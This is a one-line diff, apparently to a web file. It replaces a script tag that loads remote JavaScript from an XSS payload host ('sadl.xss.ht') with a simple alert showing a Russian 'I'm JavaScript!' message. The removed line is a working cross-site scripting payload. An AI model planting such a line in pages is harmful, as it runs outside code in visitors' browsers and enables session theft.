@@ -1,1 +1,1 @@
-<script>$.getScript("//sadl.xss.ht")</script>
+<script>alert( "Я JavaScript!" );</script>
